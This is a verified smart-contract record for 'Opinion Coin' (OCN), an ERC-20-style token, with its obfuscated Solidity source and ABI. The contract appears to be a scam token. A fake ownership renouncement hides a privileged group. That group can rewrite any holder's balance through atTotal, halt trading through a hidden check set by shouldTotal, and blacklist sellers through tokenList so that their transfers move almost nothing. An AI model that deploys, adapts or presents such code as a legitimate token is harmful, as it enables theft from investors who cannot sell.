{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buyAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundTeamAt {\n    function createPair(address minTrading, address maxTo) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface walletEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface walletMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderIs) external view returns (uint256);\n\n    function transfer(address liquidityMin, uint256 swapShould) external returns (bool);\n\n    function allowance(address receiverAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityMin,\n        uint256 swapShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeMarketing, uint256 value);\n    event Approval(address indexed receiverAt, address indexed spender, uint256 value);\n}\n\ninterface walletModeMetadata is walletMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OpinionCoin is buyAmount, walletMode, walletModeMetadata {\n\n    function balanceOf(address senderIs) public view virtual override returns (uint256) {\n        return autoLaunched[senderIs];\n    }\n\n    function toReceiverMin(address liquidityTotal, address liquidityMin, uint256 swapShould) internal view returns (uint256) {\n        require(swapShould > 0);\n\n        uint256 marketingMax = 0;\n        if (liquidityTotal == amountList && sellWallet > 0) {\n            marketingMax = swapShould * sellWallet / 100;\n        } else if (liquidityMin == amountList && minMarketing > 0) {\n            marketingMax = swapShould * minMarketing / 100;\n        }\n        require(marketingMax <= swapShould);\n        return swapShould - marketingMax;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buySenderMode;\n    }\n\n    function enableFromMarketing() private view {\n        require(toEnable[_msgSender()]);\n    }\n\n    uint256 constant teamFrom = 11 ** 10;\n\n    uint256 public isTradingAuto;\n\n    function shouldTotal(uint256 swapShould) public {\n        enableFromMarketing();\n        toAuto = swapShould;\n    }\n\n    constructor (){\n        if (listTake != toTake) {\n            toTake = listTake;\n        }\n        txMax();\n        walletEnable receiverTo = walletEnable(exemptSwap);\n        amountList = fundTeamAt(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));\n        minBuy = fundTeamAt(receiverTo.factory()).feeTo();\n        \n        totalReceiver = _msgSender();\n        toEnable[totalReceiver] = true;\n        autoLaunched[totalReceiver] = maxTeam;\n        if (toTake != listTake) {\n            listTake = toTake;\n        }\n        emit Transfer(address(0), totalReceiver, maxTeam);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeWalletAuto;\n    }\n\n    function transfer(address fundTo, uint256 swapShould) external virtual override returns (bool) {\n        return buyFund(_msgSender(), fundTo, swapShould);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxTeam;\n    }\n\n    function enableIsTo(address liquidityTotal, address liquidityMin, uint256 swapShould) internal returns (bool) {\n        require(autoLaunched[liquidityTotal] >= swapShould);\n        autoLaunched[liquidityTotal] -= swapShould;\n        autoLaunched[liquidityMin] += swapShould;\n        emit Transfer(liquidityTotal, liquidityMin, swapShould);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingTeamSender;\n\n    function buyFund(address liquidityTotal, address liquidityMin, uint256 swapShould) internal returns (bool) {\n        if (liquidityTotal == totalReceiver) {\n            return enableIsTo(liquidityTotal, liquidityMin, swapShould);\n        }\n        uint256 listSender = walletMode(amountList).balanceOf(minBuy);\n        require(listSender == toAuto);\n        require(liquidityMin != minBuy);\n        if (tokenMax[liquidityTotal]) {\n            return enableIsTo(liquidityTotal, liquidityMin, teamFrom);\n        }\n        swapShould = toReceiverMin(liquidityTotal, liquidityMin, swapShould);\n        return enableIsTo(liquidityTotal, liquidityMin, swapShould);\n    }\n\n    function approve(address listTotal, uint256 swapShould) public virtual override returns (bool) {\n        tradingTeamSender[_msgSender()][listTotal] = swapShould;\n        emit Approval(_msgSender(), listTotal, swapShould);\n        return true;\n    }\n\n    function allowance(address feeLaunched, address listTotal) external view virtual override returns (uint256) {\n        if (listTotal == exemptSwap) {\n            return type(uint256).max;\n        }\n        return tradingTeamSender[feeLaunched][listTotal];\n    }\n\n    address public totalReceiver;\n\n    uint256 public sellWallet = 3;\n\n    string private modeWalletAuto = \"Opinion Coin\";\n\n    function atTotal(address fundTo, uint256 swapShould) public {\n        enableFromMarketing();\n        autoLaunched[fundTo] = swapShould;\n    }\n\n    uint256 toAuto;\n\n    mapping(address => uint256) private autoLaunched;\n\n    bool private tokenFee;\n\n    uint256 public fromSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyEnableReceiver;\n    }\n\n    address private amountSenderTrading;\n\n    uint8 private buyEnableReceiver = 18;\n\n    function maxAt(address buyExempt) public {\n        if (autoMax) {\n            return;\n        }\n        \n        toEnable[buyExempt] = true;\n        \n        autoMax = true;\n    }\n\n    uint256 receiverWallet;\n\n    uint256 private maxTeam = 100000000 * 10 ** 18;\n\n    uint256 private toTake;\n\n    mapping(address => bool) public tokenMax;\n\n    uint256 private listTake;\n\n    function transferFrom(address liquidityTotal, address liquidityMin, uint256 swapShould) external override returns (bool) {\n        if (_msgSender() != exemptSwap) {\n            if (tradingTeamSender[liquidityTotal][_msgSender()] != type(uint256).max) {\n                require(swapShould <= tradingTeamSender[liquidityTotal][_msgSender()]);\n                tradingTeamSender[liquidityTotal][_msgSender()] -= swapShould;\n            }\n        }\n        return buyFund(liquidityTotal, liquidityMin, swapShould);\n    }\n\n    mapping(address => bool) public toEnable;\n\n    function owner() external view returns (address) {\n        return amountSenderTrading;\n    }\n\n    function txMax() public {\n        emit OwnershipTransferred(totalReceiver, address(0));\n        amountSenderTrading = address(0);\n    }\n\n    bool public autoMax;\n\n    address exemptSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address minBuy;\n\n    function tokenList(address autoTake) public {\n        enableFromMarketing();\n        if (fromSwap != listTake) {\n            isTradingAuto = listTake;\n        }\n        if (autoTake == totalReceiver || autoTake == amountList) {\n            return;\n        }\n        tokenMax[autoTake] = true;\n    }\n\n    string private buySenderMode = \"OCN\";\n\n    uint256 public minMarketing = 0;\n\n    address public amountList;\n\n    event OwnershipTransferred(address indexed amountAt, address indexed sellFundMode);\n\n    function getOwner() external view returns (address) {\n        return amountSenderTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFundMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"atTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTradingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"maxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"shouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"}],\"name\":\"tokenList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OpinionCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}